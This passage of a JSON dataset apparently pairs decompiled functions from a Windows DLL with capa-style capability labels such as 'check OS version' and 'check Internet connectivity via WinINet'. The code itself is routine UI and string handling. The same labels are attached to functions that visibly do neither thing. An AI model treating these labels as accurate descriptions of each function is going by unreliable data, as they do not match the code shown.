CONCAT62(Stack86, uStack88);\n            iVar9 = iVar12;\n            if ((CONCAT44(uStack60, uStack64) * 2 + 2 < 0x1000) ||\n               (iVar9 = *(iVar12 + -8),  (iVar12 - iVar9) - 8U < 0x20)) {\n                fcn.18008fb24(iVar9);\n                goto code_r0x00018004ced7;\n            }\n        }\n        else {\n            iVar12 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            iVar9 = iVar12;\n            if ((uStack32 * 2 + 2 < 0x1000) || (iVar9 = *(iVar12 + -8),  (iVar12 - iVar9) - 8U < 0x20)) {\n                fcn.18008fb24(iVar9);\n                goto code_r0x00018004ce86;\n            }\ncode_r0x00018004d213:\n            fcn.1800b3528();\n        }\n        fcn.1800b3528();\ncode_r0x00018004d21f:\n        fcn.1800b3528();\n    }\n    else {\n        (**0x1800de788)(*(arg1 + 0x18), 0x2441, 0x1800fa198);\n        fcn.180068540(*(arg1 + 0x18), 0x2441);\ncode_r0x00018004cee5:\n        if (*(arg1 + 0xb6) != '\\0') {\n            (**0x1800de788)(*(arg1 + 0x18), 0x23f7, 0x1800fa228);\n            fcn.180068540(*(arg1 + 0x18), 0x23f7);\ncode_r0x00018004d070:\n            if (*(arg1 + 0x30) != '\\0') {\n                (**0x1800de788)(*(arg1 + 0x18), 0x2419, 0x1800fa238);\n                fcn.180068540(*(arg1 + 0x18), 0x2419);\n                return;\n            }\n            uStack72 = CONCAT44(*0x180101904, *0x180101900);\n            uStack64 = *0x180101908;\n            uStack60 = *0x18010190c;\n            uStack88 = 0;\n            fcn.180010d70(&stack0xffffffffffffffa8, 0x1800fa258, 6);\n            uVar6 = uStack72;\n            if (CONCAT44(uStack60, uStack64) == uStack72) {\n                puVar8 = fcn.180013690(&stack0xffffffffffffffa8, 1, 0, 0x1800f79dc);\n            }\n            else {\n                uVar1 = uStack72 + 1;\n                uStack72 = uVar1;\n                puVar7 = &stack0xffffffffffffffa8;\n                if (7 < CONCAT44(uStack60, uStack64)) {\n                    puVar7 = CONCAT62(Stack86, uStack88);\n                }\n                *(puVar7 + uVar6 * 2) = 0x2a;\n                *(puVar7 + uVar1 * 2) = 0;\n                puVar8 = &stack0xffffffffffffffa8;\n            }\n            uStack56 = *puVar8;\n            uStack54 = *puVar8 >> 0x10;\n            uStack52 = puVar8[1];\n            uStack48 = *(puVar8 + 2);\n            uStack40 = *(puVar8 + 4);\n            uStack32 = *(puVar8 + 6);\n            *(puVar8 + 4) = 0;\n            *(puVar8 + 6) = 7;\n            *puVar8 = 0;\n            puVar7 = &stack0xffffffffffffffc8;\n            if (7 < uStack32) {\n                puVar7 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            }\n            (**0x1800de788)(*(arg1 + 0x18), 0x2419, puVar7);\n            if (7 < uStack32) {\n                iVar12 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n                iVar9 = iVar12;\n                if ((0xfff < uStack32 * 2 + 2) && (iVar9 = *(iVar12 + -8),  0x1f < (iVar12 - iVar9) - 8U))\n                goto code_r0x00018004d22b;\n                fcn.18008fb24(iVar9);\n            }\n            uStack40 = CONCAT44(*0x180101904, *0x180101900);\n            uStack32 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack56 = 0;\n            if (CONCAT44(uStack60, uStack64) < 8) goto code_r0x00018004d1e6;\n            iVar9 = CONCAT44(uStack60, uStack64) * 2;\n            iVar5 = CONCAT62(Stack86, uStack88);\n            iVar12 = iVar5;\n            if (0xfff < iVar9 + 2U) {\n                iVar12 = *(iVar5 + -8);\n                if (0x1f < (iVar5 - iVar12) - 8U) {\n                    fcn.1800b3528(uStack40, iVar12, iVar9 + 0x29);\n                    goto code_r0x00018004d213;\n                }\n            }\n            fcn.18008fb24(iVar12);\ncode_r0x00018004d1e6:\n            fcn.180068600(*(arg1 + 0x18), 0x2419);\n            return;\n        }\n        uStack72 = CONCAT44(*0x180101904, *0x180101900);\n        uStack64 = *0x180101908;\n        uStack60 = *0x18010190c;\n        uStack88 = 0;\n        fcn.180010d70(&stack0xffffffffffffffa8, 0x1800fa248, 6);\n        uVar6 = uStack72;\n        if (CONCAT44(uStack60, uStack64) == uStack72) {\n            puVar8 = fcn.180013690(&stack0xffffffffffffffa8, 1, 0, 0x1800f79cc);\n        }\n        else {\n            uVar1 = uStack72 + 1;\n            uStack72 = uVar1;\n            puVar7 = &stack0xffffffffffffffa8;\n            if (7 < CONCAT44(uStack60, uStack64)) {\n                puVar7 = CONCAT62(Stack86, uStack88);\n            }\n            *(puVar7 + uVar6 * 2) = 0x2a;\n            *(puVar7 + uVar1 * 2) = 0;\n            puVar8 = &stack0xffffffffffffffa8;\n        }\n        uStack56 = *puVar8;\n        uStack54 = *puVar8 >> 0x10;\n        uStack52 = puVar8[1];\n        uStack48 = *(puVar8 + 2);\n        uStack40 = *(puVar8 + 4);\n        uStack32 = *(puVar8 + 6);\n        *(puVar8 + 4) = 0;\n        *(puVar8 + 6) = 7;\n        *puVar8 = 0;\n        puVar7 = &stack0xffffffffffffffc8;\n        if (7 < uStack32) {\n            puVar7 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n        }\n        (**0x1800de788)(*(arg1 + 0x18), 0x23f7, puVar7);\n        if (7 < uStack32) {\n            iVar12 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            iVar9 = iVar12;\n            if ((uStack32 * 2 + 2 < 0x1000) || (iVar9 = *(iVar12 + -8),  (iVar12 - iVar9) - 8U < 0x20)) {\n                fcn.18008fb24(iVar9);\n                goto code_r0x00018004d011;\n            }\n            goto code_r0x00018004d21f;\n        }\ncode_r0x00018004d011:\n        uStack40 = CONCAT44(*0x180101904, *0x180101900);\n        uStack32 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack56 = 0;\n        if (CONCAT44(uStack60, uStack64) < 8) {\ncode_r0x00018004d062:\n            fcn.180068600(*(arg1 + 0x18), 0x23f7);\n            goto code_r0x00018004d070;\n        }\n        iVar12 = CONCAT62(Stack86, uStack88);\n        iVar9 = iVar12;\n        if ((CONCAT44(uStack60, uStack64) * 2 + 2 < 0x1000) || (iVar9 = *(iVar12 + -8),  (iVar12 - iVar9) - 8U < 0x20))\n        {\n            fcn.18008fb24(iVar9);\n            goto code_r0x00018004d062;\n        }\n    }\n    fcn.1800b3528();\ncode_r0x00018004d22b:\n    fcn.1800b3528();\n    pcVar4 = swi(3);\n    (*pcVar4)();\n    return;\n}\n",
        "token_count": 4343
    },
    "18004fdd": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18004fdd0(int64_t arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    int64_t iVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int64_t iVar14;\n    int64_t iVar15;\n    uchar auStack280 [32];\n    uchar auStack248 [208];\n    uint64_t uStack40;\n    \n    uStack40 = *0x180123080 ^ auStack280;\n    iVar12 = (**0x1800de7f0)(*(arg1 + 0xb8), 0x188, 0, 0);\n    if ((iVar12 != -1) && (iVar13 = (**0x1800de7f0)(*(arg1 + 0xc0), 0x188, 0, 0),  iVar13 != -1)) {\n        iVar1 = *(arg1 + 200) + iVar12 * 0x48;\n        if (arg2 == -1) {\n            if (iVar13 == 0) goto code_r0x00018004fe66;\n        }\n        else if ((arg2 != 1) || ((*(iVar1 + 0x38) - *(iVar1 + 0x30) >> 4) + -1 <= iVar13)) goto code_r0x00018004fe66;\n        iVar4 = *(iVar1 + 0x30);\n        iVar14 = iVar13;\n        iVar15 = arg2 + iVar13;\n        puVar2 = iVar4 + iVar14 * 0x10;\n        uVar5 = *puVar2;\n        uVar6 = puVar2[1];\n        uVar7 = puVar2[2];\n        uVar8 = puVar2[3];\n        puVar2 = iVar4 + iVar15 * 0x10;\n        uVar9 = puVar2[1];\n        uVar10 = puVar2[2];\n        uVar11 = puVar2[3];\n        puVar3 = iVar4 + iVar14 * 0x10;\n        *puVar3 = *puVar2;\n        puVar3[1] = uVar9;\n        puVar3[2] = uVar10;\n        puVar3[3] = uVar11;\n        puVar2 = *(iVar1 + 0x30) + iVar15 * 0x10;\n        *puVar2 = uVar5;\n        puVar2[1] = uVar6;\n        puVar2[2] = uVar7;\n        puVar2[3] = uVar8;\n        fcn.1800ae290(auStack248, 0, 200);\n        (**0x1800de7f0)(*(arg1 + 0xc0), 0x189, iVar14, auStack248);\n        (**0x1800de7f0)(*(arg1 + 0xc0), 0x182, iVar14, 0);\n        (**0x1800de7f0)(*(arg1 + 0xc0), 0x181, iVar15, auStack248);\n        (**0x1800de7f0)(*(arg1 + 0xc0), 0x186, iVar15, 0);\n        *(arg1 + 0xb5) = 0;\n        fcn.18004cd30(arg1);\n        fcn.18004fc00(arg1);\n        fcn.180050280(arg1, 0, 0x1d);\n    }\ncode_r0x00018004fe66:\n    fcn.18008fb00(uStack40 ^ auStack280);\n    return;\n}\n",
        "token_count": 853
    },
    "18005001": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.180050010(int64_t arg1)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puStackX8;\n    \n    if (*(arg1 + 0x30) == '\\0') {\n        cVar1 = fcn.18004f040(arg1, &puStackX8);\n        if (cVar1 != '\\0') {\n            uVar2 = (**0x1800de7f0)(*(arg1 + 0xc0), 0x188, 0, 0);\n            if (uVar2 == 0xffffffff) {\n                uVar2 = 0xffffffff;\n            }\n            uVar3 = fcn.18004b560(arg1 + 0x30);\n            *puStackX8 = uVar3;\n            uVar3 = fcn.18004b560(arg1 + 0x30);\n            puStackX8[1] = uVar3;\n            iVar4 = (**0x1800de740)(*(arg1 + 0x18), 0x2718);\n            puStackX8[2] = iVar4 == 1;\n            iVar4 = (**0x1800de740)(*(arg1 + 0x18));\n            puStackX8[3] = iVar4 == 1;\n            fcn.180050280(arg1, uVar2, uVar2);\n            *(arg1 + 0xb5) = 0;\n            *(arg1 + 0x30) = 1;\n            fcn.18004fcf0(arg1);\n        }\n    }\n    return;\n}\n",
        "token_count": 365
    },
    "1800505f": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1800505f0(int64_t arg1)\n\n{\n    int32_t iVar1;\n    char in_DL;\n    int64_t iVar2;\n    int64_t **arg1_00;\n    int64_t arg3;\n    int64_t **ppiVar3;\n    uchar auStack584 [32];\n    int16_t aiStack552 [264];\n    uint64_t uStack24;\n    \n    uStack24 = *0x180123080 ^ auStack584;\n    if ((*(arg1 + 0xb6) == '\\0') && (iVar1 = (**0x1800de7f0)(*(arg1 + 0xb8), 0x188, 0, 0),  iVar1 != -1)) {\n        iVar2 = iVar1;\n        arg1_00 = *(arg1 + 200) + iVar2 * 0x48;\n        if (in_DL == '\\0') {\n            if (arg1_00[2] == NULL) {\n                fcn.1800510e0(arg1);\n                goto code_r0x00018005075b;\n            }\n            *(arg1 + 0xb4) = 1;\n            ppiVar3 = arg1_00;\n            if (0x7 < arg1_00[3]) {\n                ppiVar3 = *arg1_00;\n            }\n            (**0x1800de788)(*(arg1 + 0x18), 0x23f6, ppiVar3);\n            *(arg1 + 0xb4) = 0;\n        }\n        else {\n            (**0x1800de728)(*(arg1 + 0x18), 0x23f6, aiStack552, 0x105);\n            arg3 = -1;\n            do {\n                arg3 = arg3 + 1;\n            } while (aiStack552[arg3] != 0);\n            fcn.180010d70(arg1_00, aiStack552, arg3);\n        }\n        (**0x1800de7f0)(*(arg1 + 0xb8), 0x182, iVar2, 0);\n        if (0x7 < arg1_00[3]) {\n            arg1_00 = *arg1_00;\n        }\n        (**0x1800de7f0)(*(arg1 + 0xb8), 0x181, iVar2, arg1_00);\n        (**0x1800de7f0)(*(arg1 + 0xb8), 0x186, iVar2, 0);\n        *(arg1 + 0xb5) = 0x100;\n        fcn.18004f340(arg1);\n    }\ncode_r0x00018005075b:\n    fcn.18008fb00(uStack24 ^ auStack584);\n    return;\n}\n",
        "token_count": 619
    },
    "180054d5": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000180058110)\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_bp_10h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180054d50(int64_t arg1)\n\n{\n    char cVar1;\n    ulong uVar2;\n    ulong uVar3;\n    ulong *puVar4;\n    uint8_t in_DL;\n    ulong unaff_RBX;\n    int64_t iVar5;\n    ulong unaff_RBP;\n    ulong unaff_RDI;\n    uchar in_stack_00000000;\n    unkbyte7 in_stack_00000001;\n    ulong in_stack_00000008;\n    ulong in_stack_00000020;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong in_stack_00000048;\n    ulong in_stack_00000050;\n    ulong in_stack_00000058;\n    ulong in_stack_00000060;\n    ulong in_stack_00000068;\n    ulong in_stack_00000070;\n    ulong in_stack_00000078;\n    ulong in_stack_00000080;\n    ulong in_stack_00000088;\n    ulong in_stack_00000090;\n    ulong in_stack_00000098;\n    ulong in_stack_000000a0;\n    ulong in_stack_000000a8;\n    ulong in_stack_000000b0;\n    ulong in_stack_000000b8;\n    ulong in_stack_000000c0;\n    ulong in_stack_000000c8;\n    uchar auStack136 [32];\n    uchar auStack104 [8];\n    ulong uStack96;\n    ulong uStack88;\n    ulong uStack80;\n    uchar auStack72 [16];\n    ulong in_stack_ffffffffffffffc8;\n    ulong in_stack_ffffffffffffffd0;\n    uint64_t var_20h;\n    ulong in_stack_ffffffffffffffe0;\n    uchar *var_bp_10h;\n    uint64_t var_8h;\n    \n    uVar3 = *(arg1 + 0x18);\n    uStack96 = 0x180054d84;\n    (**0x1800de7f0)(*(arg1 + 0x10), (in_DL ^ 1) + 0x806);\n    if (*(arg1 + 0xc5) != '\\0') {\n        if (in_DL == 0) {\n            var_8h = 0xf;\n            var_bp_10h = NULL;\n            puVar4 = &fcn.180054d50::var_20h;\n            var_20h = var_20h & 0xffffffffffffff00;\n            uStack96 = 0x180054dbc;\n            fcn.180011120(puVar4, \"ClearVizOnPanelClose\", 0x14);\n            uStack96 = 0x180054dc8;\n            cVar1 = fcn.180007d40(puVar4, &fcn.180054d50::var_20h);\n            *(arg1 + 0xc4) = cVar1;\n            if (cVar1 != '\\0') {\n                var_20h = 0xfffffffffffffffe;\n                var_8h = *0x180123080 ^ &stack0xffffffffffffff78;\n                var_bp_10h = CONCAT44(var_bp_10h._4_4_, 0xffffffff);\n                (**0x1800de7f0)(*0x18012a390, 0x7ec, 0, &fcn.180054d50::var_bp_10h);\n                if (-1 < var_bp_10h) {\n                    iVar5 = *0x18012a398;\n                    if (var_bp_10h != 0) {\n                        iVar5 = *0x18012a3a0;\n                    }\n                    if (iVar5 != 0) {\n                        (**0x1800de7f0)(iVar5, 0x7f0, 0, 0);\n                        uVar3 = (**0x1800de7f0)(iVar5, 0x7d6, 0, 0);\n                        (**0x1800de7f0)(iVar5, 0x7f1, uVar3, 0x20);\n                        uStack88 = 0;\n                        uStack80 = 0xf;\n                        auStack104[0] = 0;\n                        fcn.180011120(&stack0xffffffffffffff98, 0x1800f4876, 0);\n                        fcn.1800608d0(arg1, &stack0xffffffffffffff98);\n                        var_bp_10h = &stack0xffffffffffffff98;\n                        uStack88 = 0;\n                        uStack80 = 0xf;\n                        auStack104[0] = 0;\n                        fcn.180011120(&stack0xffffffffffffff98, 0x1800f48b7, 0);\n                        auStack72[0] = 0;\n                        fcn.180011120(&stack0xffffffffffffffb8, 0x1800f48b6, 0);\n                        fcn.1800609f0(arg1, &stack0xffffffffffffffb8, &stack0xffffffffffffff98);\n                        fcn.180061430(arg1);\n                    }\n                }\n                fcn.18008fb00(var_8h ^ &stack0xffffffffffffff78);\n                return;\n            }\n        }\n        else {\n            uStack96 = 0x180054dfe;\n            uVar2 = (**0x1800de798)(*(arg1 + 0x18), 0x232c);\n            *(arg1 + 0x88) = uVar2;\n            uStack96 = 0x180054e14;\n            uVar2 = (**0x1800de798)(*(arg1 + 0x18), 0x232f);\n            *(arg1 + 0x90) = uVar2;\n            uStack96 = 0x180054e2a;\n            uVar2 = (**0x1800de798)(*(arg1 + 0x18), 0x233e);\n            var_8h = 0xf;\n            *(arg1 + 0x98) = uVar2;\n            puVar4 = &fcn.180054d50::var_20h;\n            var_bp_10h = NULL;\n            var_20h = var_20h & 0xffffffffffffff00;\n            uStack96 = 0x180054e57;\n            fcn.180011120(puVar4, 0x1800fc888, 0x12);\n            uStack96 = 0x180054e63;\n            fcn.180007d40(puVar4, &fcn.180054d50::var_20h);\n            uStack96 = 0x180054e7b;\n            (**0x1800de758)(*(arg1 + 0x18), 0x235b);\n            uStack96 = 0x180054e83;\n            fcn.180054fe0(arg1);\n            var_bp_10h = NULL;\n            var_8h = 0xf;\n            puVar4 = &fcn.180054d50::var_20h;\n            var_20h = var_20h & 0xffffffffffffff00;\n            uStack96 = 0x180054ea7;\n            fcn.180011120(puVar4, 0x1800fc8c8, 0x11);\n            uStack96 = 0x180054eb3;\n            fcn.180007d40(puVar4, &fcn.180054d50::var_20h);\n            uStack96 = 0x180054ecb;\n            (**0x1800de758)(*(arg1 + 0x18), 0x235f);\n            var_bp_10h = NULL;\n            var_8h = 0xf;\n            puVar4 = &fcn.180054d50::var_20h;\n            var_20h = var_20h & 0xffffffffffffff00;\n            uStack96 = 0x180054eef;\n            fcn.180011120(puVar4, 0x1800fc8b8, 0xb);\n            uStack96 = 0x180054efb;\n            fcn.180007d40(puVar4, &fcn.180054d50::var_20h);\n            uStack96 = 0x180054f13;\n            (**0x1800de758)(*(arg1 + 0x18), 0x2360);\n            var_bp_10h = NULL;\n            var_8h = 0xf;\n            puVar4 = &fcn.180054d50::var_20h;\n            var_20h = var_20h & 0xffffffffffffff00;\n            uStack96 = 0x180054f37;\n            fcn.180011120(puVar4, 0x1800fc8e0, 0xd);\n            uStack96 = 0x180054f43;\n            fcn.180007d40(puVar4, &fcn.180054d50::var_20h);\n            uStack96 = 0x180054f5b;\n            (**0x1800de758)(*(arg1 + 0x18), 0x2368);\n            *(arg1 + 0xc4) = 1;\n            var_bp_10h = NULL;\n            var_8h = 0xf;\n            var_20h = var_20h & 0xffffffffffffff00;\n            uStack96 = 0x180054f85;\n            fcn.180011120(&fcn.180054d50::var_20h, 0x1800f47b3, 0);\n            uStack96 = 0x180054f9d;\n            fcn.1800562f0(arg1, &fcn.180054d50::var_20h, 1, CONCAT71(uVar3 >> 8, 1), \n                          CONCAT71(in_stack_ffffffffffffffc8 >> 8, 1), in_stack_ffffffffffffffd0, var_20h, \n                          in_stack_ffffffffffffffe0, var_bp_10h, var_8h, unaff_RBP, \n                          CONCAT71(in_stack_00000001, in_stack_00000000), in_stack_00000008, unaff_RBX, unaff_RDI, \n                          in_stack_00000020, in_stack_00000028, in_stack_00000030, in_stack_00000038, in_stack_00000040\n                          , in_stack_00000048, in_stack_00000050, in_stack_00000058, in_stack_00000060, \n                          in_stack_00000068, in_stack_00000070, in_stack_00000078, in_stack_00000080, in_stack_00000088\n                          , in_stack_00000090, in_stack_00000098, in_stack_000000a0, in_stack_000000a8, \n                          in_stack_000000b0, in_stack_000000b8, in_stack_000000c0, in_stack_000000c8);\n            if (*(arg1 + 0xc4) != '\\0') {\n    // WARNING: Could not recover jumptable at 0x000180054fbc. Too many branches\n    // WARNING: Treating indirect jump as call\n                (**0x1800de6f0)(*(arg1 + 0x88));\n                return;\n            }\n            uStack96 = 0x180054fc8;\n            fcn.1800613b0();\n        }\n    }\n    return;\n}\n",
        "token_count": 2619
    },
    "18005523": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180055230(int64_t arg1)\n\n{\n    uchar (**arg1_00) [16];\n    uchar (*pauVar1) [16];\n    code *pcVar2;\n    int64_t iVar3;\n    int32_t iVar4;\n    ulong *puVar5;\n    uchar *puVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    uchar (*pauVar9) [16];\n    uint64_t arg2;\n    int64_t iVar10;\n    uint64_t uVar11;\n    uint64_t uVar12;\n    uchar extraout_XMM0 [16];\n    uchar auVar13 [16];\n    uchar auStack264 [32];\n    uchar *puStack232;\n    uchar *puStack224;\n    uchar uStack216;\n    unkbyte7 Stack215;\n    ulong uStack200;\n    uint64_t uStack192;\n    uchar uStack184;\n    unkbyte7 Stack183;\n    ulong uStack168;\n    uint64_t uStack160;\n    uchar auStack152 [16];\n    ulong uStack136;\n    ulong uStack128;\n    uchar *puStack120;\n    ulong uStack112;\n    uchar uStack104;\n    unkbyte7 Stack103;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uchar auStack72 [16];\n    int64_t iStack56;\n    uint64_t uStack48;\n    \n    uStack112 = 0xfffffffffffffffe;\n    uStack48 = *0x180123080 ^ auStack264;\n    (**0x1800de7f0)(*(arg1 + 0x88), 0x14b, 0, 0);\n    if (*(arg1 + 0xc5) == '\\0') goto code_r0x000180055791;\n    auStack72 = ZEXT816(0);\n    uVar11 = 0;\n    iStack56 = 0;\n    puStack120 = auStack152;\n    uStack136 = 0;\n    uStack128 = 0xf;\n    auStack152[0] = 0;\n    fcn.180011120(auStack152, 0x1800f47b6, 0);\n    uStack88 = *0x180101910;\n    uStack84 = *0x180101914;\n    uStack80 = *0x180101918;\n    uStack76 = *0x18010191c;\n    uStack104 = 0;\n    fcn.180011120(&uStack104, 0x1800f47b7, 0);\n    uStack200 = CONCAT44(*0x180101914, *0x180101910);\n    uStack192 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack216 = 0;\n    fcn.180011120(&uStack216, 0x1800fc920, 9);\n    uStack168 = CONCAT44(*0x180101914, *0x180101910);\n    uStack160 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack184 = 0;\n    puVar6 = &uStack184;\n    fcn.180011120(puVar6, 0x1800f9a54, 4);\n    puStack224 = auStack152;\n    puStack232 = &uStack104;\n    iVar4 = fcn.180009a40(puVar6, auStack72, &uStack184, &uStack216);\n    arg2 = iVar4;\n    if (uStack160 < 0x10) {\ncode_r0x00018005539f:\n        uStack168 = CONCAT44(*0x180101914, *0x180101910);\n        uStack160 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack184 = 0;\n        if (0xf < uStack192) {\n            iVar7 = CONCAT71(Stack215, uStack216);\n            iVar10 = iVar7;\n            if ((0xfff < uStack192 + 1) && (iVar10 = *(iVar7 + -8),  0x1f < (iVar7 - iVar10) - 8U))\n            goto code_r0x0001800557ca;\n            fcn.18008fb24(iVar10);\n        }\n        uStack200 = CONCAT44(*0x180101914, *0x180101910);\n        uStack192 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack216 = 0;\n        if (0xf < CONCAT44(uStack76, uStack80)) {\n            iVar7 = CONCAT71(Stack103, uStack104);\n            iVar10 = iVar7;\n            if ((0xfff < CONCAT44(uStack76, uStack80) + 1) && (iVar10 = *(iVar7 + -8),  0x1f < (iVar7 - iVar10) - 8U))\n            goto code_r0x0001800557d0;\n            fcn.18008fb24(iVar10);\n        }\n        uStack88 = *0x180101910;\n        uStack84 = *0x180101914;\n        uStack80 = *0x180101918;\n        uStack76 = *0x18010191c;\n        uStack104 = 0;\n        arg1_00 = arg1 + 0xf0;\n        fcn.180064010(*arg1_00, *(arg1 + 0xf8));\n        pauVar9 = *arg1_00;\n        *(arg1 + 0xf8) = pauVar9;\n        pauVar1 = *arg1_00;\n        uVar8 = pauVar9 - pauVar1 >> 6;\n        if (arg2 < uVar8) {\n            fcn.180064010(pauVar1[arg2 * 4], pauVar9);\n            *(arg1 + 0xf8) = pauVar1[arg2 * 4];\n        }\n        else if (uVar8 < arg2) {\n            if (*(arg1 + 0x100) - pauVar1 >> 6 < arg2) {\n                fcn.180064590(arg1_00, arg2);\n            }\n            else {\n                iVar10 = arg2 - uVar8;\n                if (iVar10 != 0) {\n                    puVar5 = pauVar9[3] + 8;\n                    auVar13 = extraout_XMM0;\n                    do {\n                        auVar13 = auVar13 & 0x0;\n                        *pauVar9 = auVar13;\n                        pauVar9[1] = auVar13;\n                        pauVar9[2] = auVar13;\n                        pauVar9[3] = auVar13;\n                        puVar5[-5] = 0;\n                        puVar5[-4] = 0xf;\n                        (*pauVar9)[0] = 0;\n                        puVar5[-1] = 0;\n                        *puVar5 = 7;\n                        *(puVar5 + -3) = 0;\n                        pauVar9 = pauVar9[4];\n                        puVar5 = puVar5 + 8;\n                        iVar10 = iVar10 + -1;\n                    } while (iVar10 != 0);\n                }\n                fcn.180064010(pauVar9, pauVar9);\n                *(arg1 + 0xf8) = pauVar9;\n            }\n        }\n        (**0x1800de7f0)(*(arg1 + 0x88), 0x143, 0, 0x1800f820c);\n        uVar8 = uVar11;\n        uVar12 = uVar11;\n        if (0 < arg2) {\n            do {\n                puStack120 = auStack152;\n                uStack136 = 0;\n                uStack128 = 0xf;\n                auStack152[0] = 0;\n                fcn.180011120(auStack152, 0x1800f47bf, 0);\n                uStack168 = 0;\n                uStack160 = 0xf;\n                uStack184 = 0;\n                fcn.180011120(&uStack184, 0x1800f47be, 0);\n                uStack200 = 0;\n                uStack192 = 0xf;\n                uStack216 = 0;\n                puVar6 = &uStack216;\n                fcn.180011120(puVar6, 0x1800fc930, 9);\n                iVar10 = uVar12;\n                puStack224 = auStack152;\n                puStack232 = &uStack184;\n                fcn.180004f50(puVar6, &uStack104, iVar10 * 0x20 + auStack72._0_8_, &uStack216);\n                if (0xf < uStack192) {\n                    iVar3 = CONCAT71(Stack215, uStack216);\n                    iVar7 = iVar3;\n                    if ((0xfff < uStack192 + 1) && (iVar7 = *(iVar3 + -8),  0x1f < (iVar3 - iVar7) - 8U))\n                    goto code_r0x0001800557dc;\n                    fcn.18008fb24(iVar7);\n                }\n                uStack200 = 0;\n                uStack192 = 0xf;\n                uStack216 = 0;\n                if (0xf < uStack160) {\n                    iVar3 = CONCAT71(Stack183, uStack184);\n                    iVar7 = iVar3;\n                    if ((0xfff < uStack160 + 1) && (iVar7 = *(iVar3 + -8),  0x1f < (iVar3 - iVar7) - 8U))\n                    goto code_r0x0001800557e2;\n                    fcn.18008fb24(iVar7);\n                }\n                uStack168 = 0;\n                uStack160 = 0xf;\n                uStack184 = 0;\n                pauVar9 = auStack72._0_8_ + uVar8;\n                if ((*arg1_00)[iVar10 * 4] != pauVar9) {\n                    pauVar1 = pauVar9[1];\n                    if (0xf < *(pauVar9[1] + 8)) {\n                        pauVar9 = **pauVar9;\n                    }\n                    fcn.180011120((*arg1_00)[iVar10 * 4], pauVar9, **pauVar1);\n                }\n                if ((*arg1_00)[iVar10 * 4 + 2] != &uStack104) {\n                    puVar6 = &uStack104;\n                    if (7 < CONCAT44(uStack76, uStack80)) {\n                        puVar6 = CONCAT71(Stack103, uStack104);\n                    }\n                    fcn.180010d70((*arg1_00)[iVar10 * 4 + 2], puVar6, CONCAT44(uStack84, uStack88));\n                }\n                puVar6 = &uStack104;\n                if (7 < CONCAT44(uStack76, uStack80)) {\n                    puVar6 = CONCAT71(Stack103, uStack104);\n                }\n                (**0x1800de7f0)(*(arg1 + 0x88), 0x143, 0, puVar6);\n                if (7 < CONCAT44(uStack76, uStack80)) {\n                    iVar10 = CONCAT44(uStack76, uStack80) * 2;\n                    iVar3 = CONCAT71(Stack103, uStack104);\n                    iVar7 = iVar3;\n                    if (0xfff < iVar10 + 2U) {\n                        iVar7 = *(iVar3 + -8);\n                        if (0x1f < (iVar3 - iVar7) - 8U) {\n                            fcn.1800b3528(iVar7, iVar10 + 0x29);\n                            goto code_r0x0001800557c4;\n                        }\n                    }\n                    fcn.18008fb24(iVar7);\n                }\n                uVar11 = uVar11 + 1;\n                uVar8 = uVar8 + 0x20;\n                uVar12 = uVar12 + 1;\n            } while (uVar11 < arg2);\n        }\n        if (auStack72._0_8_ != 0) {\n            fcn.180013b30(auStack72._0_8_, auStack72._8_8_);\n            iVar10 = auStack72._0_8_;\n            if ((0xfff < (iStack56 - auStack72._0_8_ & 0xffffffffffffffe0U)) &&\n               (iVar10 = *(auStack72._0_8_ + -8),  0x1f < (auStack72._0_8_ - iVar10) - 8U)) goto code_r0x0001800557d6;\n            fcn.18008fb24(iVar10);\n        }\ncode_r0x000180055791:\n        fcn.18008fb00(uStack48 ^ auStack264);\n        return;\n    }\n    iVar7 = 